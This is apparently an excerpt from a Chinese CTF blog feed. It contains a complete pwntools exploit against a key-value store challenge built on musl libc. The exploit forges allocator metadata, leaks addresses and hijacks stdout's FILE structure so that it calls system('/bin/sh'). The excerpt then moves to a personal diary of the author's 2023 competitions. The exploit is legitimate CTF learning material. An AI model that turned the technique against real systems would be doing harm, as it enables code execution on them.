class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./libc.so&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过dequeue的unlink在stdout-0x10 的地方写入fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将该fake meta进入active队列</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改meta的mem区域指向stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023小琐碎记录贴</title>
      <link href="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
      <url>/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h1><p>加入<code>Sloth</code>咯！！！<br>上学期<code>XSCTF</code>联合招新赛爆<code>0</code>后就没有在<code>CTF</code>走下去的打算，可是寒假在暨大的<code>i_corner</code>师傅的鼓励下打算再努力一把，刷了<code>2</code>个多月的<code>Crypto</code>和<code>misc</code>，最后在选拔赛拿了全场一血(我最爱的RSA)，太感动了<code>QAQ</code><br>不过也感受到了差距，第一名和第二名是大二的学长，分数比我高好多，同级的也有一位逆向好厉害<code>QAQ</code><br>搏一搏，单车变摩托，我要超越他们！！！！</p><h1 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h1><p>正式开始学<code>pwn</code>了捏  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="我的图图呢">  <h1 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h1><p>第一次打比赛，给打烂了捏&gt;_&lt;<br>打了一个月的<code>ret2libc</code>,才发现<code>pwn</code>原来还有这么多东西，看来要狠狠的卷了  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="我的图图呢">  <h1 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h1><p>好耶，闭关一段时间再参加比赛(蓝帽杯)，出了一道堆题，成就感拉满！！！！！！</p><h1 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h1><p>数模国赛逆大天，首先是有<code>78w</code>行数据，脚本跑一次好好几分钟，其次是题目完全没有思路，找不到适用的模型<code>&gt;_&lt;</code>，完全靠队友带飞<code>Orz</code></p><h1 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h1><p>香山杯太亏了，差一点点(几分)进决赛，问题出在<code>pwn</code>手(我),<code>pwn</code>差一题<code>Ak</code>，剩下一题<code>python pwn</code>，漏洞出现在<code>python</code>程序调用的函数包，函数包用<code>C++</code>写的，存在格式化字符串漏洞和栈溢出，可是我本地启动不了程序，调试不了<code>QAQ</code>，血亏，我背锅。赛后发现要使用<code>python3.7</code>才可以启动程序，裂大开<br>后期补充：决赛<code>awdp</code>的<code>3</code>题<code>pwn</code>我都会做，没去线下太可惜了，哦对，我还没进过线下(卑微)</p><h1 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h1><p>XSCTF联合招新赛结束拉，嘿嘿，第一次出题(一道简单的libc-2.27的unlink)，居然没人做？完了，要给<code>JANlittle</code>拉去喂鱼了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="我的图图呢">  <p>pwn的解题情况惨不忍睹，别后继无人啊QAQ(以后谁来带我)<br>133nson和Csome师兄出的<code>pwn</code>题质量是真的高，我要好好学习</p><h1 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h1><p>嘿嘿，<code>CS</code>杯选拔赛，欺负老实人<br>谁说算法只能用<code>C/C++</code>打的，上<code>python</code>！！！！！<br>4道题15分钟干了3题，而且2题一血，不过最后一题用深搜超时，到最后都没有做出来，哎，算法太烂了，而且好久没看了，人菜瘾大xD</p><h1 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h1><p>PolarCTF打爽了 Solved:24 grade:7000 rank:3<br>11题pwn全都会(有一题<code>house of orange</code>嫌麻烦且分不高没打，结果给<code>jelasin</code>师傅骂了<code>QAQ</code>)，还拿了题唯一血(预期解为改<code>printf</code>的格式表？不存在的，打<code>IO</code>才是<code>yyds</code>！！！)<br>Crypto全是脑洞题，没有数学题，差评QAQ，只会数学题&gt;_&lt;<br>有题逆向做出来后怎么交都是错，结束后才发现<code>flag</code>要进行<code>md5</code>加密，逆天(貌似题目上也没有说明XD)</p><h1 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h1><p>给<code>Csome</code>师兄拉去<code>S1uM4i</code>打<code>TCTF/0CTF</code>,坐大牢！！！题目过于逆天，连什么<code>ios kernel</code>都来了，感觉最少还要再练一年才能在这个比赛上做出题。<br>才大二，还来得及，冲！！！！</p><h1 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h1><p>强网杯太逆天了啊，学会了各种<code>io file</code>攻击以为可以乱杀，结果发现题目都是<code>VM</code>类型，完全看不懂逆向，看来<code>kernel</code>要延后一段时间再学了，先把<code>vmpwn</code>给拿下<br>比赛有点可惜，差一点进决赛<code>QAQ</code>，归根到底是我的问题，队友很<code>c</code>了，要是我能把那两题简单<code>pwn</code>做出来就能进决赛了(<code>WTOA</code>和<code>A-rtsp</code> 都是看不懂逆向，我的<code>500</code>分鸭<code>QAQ</code>)，寒假给我狠狠卷！！！！ 备战期末，这学期绩点必须给我高高高！！！！</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="我的图图呢">  <p>虽然很遗憾，不过也学到了怎么通过<code>puts</code>函数来调用<code>io</code>链，也算是一种所获吧，强网杯已经没有想进决赛的欲望了，太卷了<br>感觉<code>AFL fuzz</code>技术也要学学，在很多题目上都能用到</p><h1 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h1><p>好好好，上大学一年多，已经变成<code>IT</code>的形状了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="我的图图呢">  <p>考完<code>java</code>放松的时候翻了一下上学期校队送的<code>《CTF权威指南 pwn篇》</code>,发现里面的内容确实基础和简单，不过当时买回来看的时候感觉在看天书，真属于是不会时看天书，会时用不上了<br>里面的很多堆利用手法都过时了，不过感觉依然可以作为一本很好很系统的<code>pwn</code>入门书籍，期末后看看能不能找到想学<code>pwn</code>的学弟，把这本书送他并天天督促他学<code>pwn</code>(已经有一位学<code>web</code>的学弟成为受害者了)，好书不能浪费(其实是怕以后没人带&gt;_&lt;)</p><h1 id="2024-1-1"><a href="#2024-1-1" 